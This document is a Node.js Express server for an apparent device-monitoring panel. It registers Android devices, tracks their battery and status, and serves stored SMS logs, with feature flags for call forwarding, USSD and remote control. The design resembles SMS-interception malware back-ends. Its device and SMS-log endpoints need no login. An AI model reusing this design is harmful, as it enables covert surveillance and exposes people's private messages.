import express from "express";
import cors from "cors";
import crypto from "crypto";
import Database from "better-sqlite3";

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors({
  origin: true,
  credentials: false
}));

app.use(express.json());

/* =========================
   DATABASE
========================= */

const db = new Database("daddy-ji.db");

db.pragma("journal_mode = WAL");

db.exec(`
  CREATE TABLE IF NOT EXISTS devices (
    id TEXT PRIMARY KEY,
    name TEXT,
    model TEXT,
    battery INTEGER,
    app_version TEXT,
    status TEXT DEFAULT 'offline',
    last_seen TEXT,
    created_at TEXT NOT NULL
  );

  CREATE TABLE IF NOT EXISTS checks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    type TEXT,
    result TEXT,
    created_at TEXT NOT NULL
  );

  CREATE TABLE IF NOT EXISTS sms_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    sender TEXT,
    message TEXT,
    created_at TEXT NOT NULL
  );

  CREATE TABLE IF NOT EXISTS sessions (
    token TEXT PRIMARY KEY,
    username TEXT NOT NULL,
    created_at TEXT NOT NULL
  );
`);

/* =========================
   HEALTH
========================= */

app.get("/health", (_req, res) => {
  res.json({
    status: "ok",
    database: {
      driver: "sqlite",
      connected: true
    },
    fcm: {
      configured: false
    }
  });
});

/* =========================
   LOGIN
========================= */

app.post("/api/customer/login", (req, res) => {
  const { username, passcode } = req.body || {};

  if (
    String(username || "").trim() !==
      String(process.env.PANEL_USERNAME || "").trim() ||
    String(passcode || "") !==
      String(process.env.PANEL_PASSCODE || "")
  ) {
    return res.status(401).json({
      error: {
        code: "INVALID_LOGIN",
        message: "Invalid username or password"
      }
    });
  }

  const token = crypto.randomUUID();

  db.prepare(`
    INSERT INTO sessions (token, username, created_at)
    VALUES (?, ?, ?)
  `).run(
    token,
    String(username).trim(),
    new Date().toISOString()
  );

  res.json({
    token,
    username: String(username).trim()
  });
});

/* =========================
   AUTH
========================= */

function getSession(req) {
  const header = req.headers.authorization || "";

  if (!header.startsWith("Bearer ")) {
    return null;
  }

  return db.prepare(`
    SELECT token, username, created_at
    FROM sessions
    WHERE token = ?
  `).get(header.slice(7)) || null;
}

/* =========================
   CUSTOMER ME
========================= */

app.get("/api/customer/me", (req, res) => {
  const session = getSession(req);

  if (!session) {
    return res.status(401).json({
      error: {
        code: "UNAUTHORIZED",
        message: "Invalid session"
      }
    });
  }

  res.json({
    username: session.username
  });
});

/* =========================
   DEVICE REGISTER
========================= */

app.post("/api/devices/register", (req, res) => {
  const {
    device_id,
    model,
    battery,
    app_version
  } = req.body || {};

  if (!device_id) {
    return res.status(400).json({
      error: "device_id required"
    });
  }

  const now = new Date().toISOString();

  db.prepare(`
    INSERT INTO devices
      (id, name, model, battery, app_version, status, last_seen, created_at)
    VALUES
      (?, ?, ?, ?, ?, 'online', ?, ?)
    ON CONFLICT(id) DO UPDATE SET
      name = excluded.name,
      model = excluded.model,
      battery = excluded.battery,
      app_version = excluded.app_version,
      status = 'online',
      last_seen = excluded.last_seen
  `).run(
    String(device_id),
    model || "Android Device",
    model || "Unknown",
    battery != null ? Number(battery) : null,
    app_version || "unknown",
    now,
    now
  );

  const device = db.prepare(`
    SELECT * FROM devices WHERE id = ?
  `).get(String(device_id));

  res.json({
    ok: true,
    device
  });
});

/* =========================
   DEVICE HEARTBEAT
========================= */

app.post("/api/devices/:id/heartbeat", (req, res) => {
  const id = String(req.params.id);

  const exists = db.prepare(`
    SELECT id FROM devices WHERE id = ?
  `).get(id);

  if (!exists) {
    return res.status(404).json({
      error: "device not registered"
    });
  }

  const battery =
    req.body?.battery !== undefined
      ? Number(req.body.battery)
      : null;

  if (battery !== null) {
    db.prepare(`
      UPDATE devices
      SET battery = ?,
          status = 'online',
          last_seen = ?
      WHERE id = ?
    `).run(battery, new Date().toISOString(), id);
  } else {
    db.prepare(`
      UPDATE devices
      SET status = 'online',
          last_seen = ?
      WHERE id = ?
    `).run(new Date().toISOString(), id);
  }

  const device = db.prepare(`
    SELECT * FROM devices WHERE id = ?
  `).get(id);

  res.json({
    ok: true,
    device
  });
});

/* =========================
   DEVICES
========================= */

app.get("/api/devices", (_req, res) => {
  const devices = db.prepare(`
    SELECT * FROM devices
    ORDER BY last_seen DESC
  `).all();

  res.json(devices);
});

/* =========================
   DEVICE SUMMARY
========================= */

app.get("/api/devices/summary", (_req, res) => {
  const total = db.prepare(`
    SELECT COUNT(*) AS count FROM devices
  `).get().count;

  const online = db.prepare(`
    SELECT COUNT(*) AS count
    FROM devices
    WHERE status = 'online'
  `).get().count;

  res.json({
    total,
    online,
    offline: total - online
  });
});

/* =========================
   SINGLE DEVICE
========================= */

app.get("/api/devices/:id", (req, res) => {
  const device = db.prepare(`
    SELECT * FROM devices WHERE id = ?
  `).get(String(req.params.id));

  if (!device) {
    return res.status(404).json({
      error: "Device not found"
    });
  }

  res.json(device);
});

/* =========================
   SMS LOGS — READ ONLY
========================= */

app.get("/api/sms", (_req, res) => {
  const messages = db.prepare(`
    SELECT *
    FROM sms_logs
    ORDER BY created_at DESC
  `).all();

  res.json(messages);
});

/* =========================
   CHECKS
========================= */

app.get("/api/checks", (_req, res) => {
  const checks = db.prepare(`
    SELECT *
    FROM checks
    ORDER BY created_at DESC
  `).all();

  res.json(checks);
});

/* =========================
   FEATURES
========================= */

app.get("/api/features", (_req, res) => {
  res.json({
    telemetry: true,
    sms: false,
    call_forwarding: false,
    ussd: false,
    remote_control: false
  });
});

/* =========================
   EVENTS
========================= */

app.get("/api/events", (req, res) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");

  res.write(
    `data: ${JSON.stringify({
      type: "connected",
      time: new Date().toISOString()
    })}\n\n`
  );

  const timer = setInterval(() => {
    res.write(
      `data: ${JSON.stringify({
        type: "heartbeat",
        time: new Date().toISOString()
      })}\n\n`
    );
  }, 30000);

  req.on("close", () => {
    clearInterval(timer);
  });
});

/* =========================
   START
========================= */

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
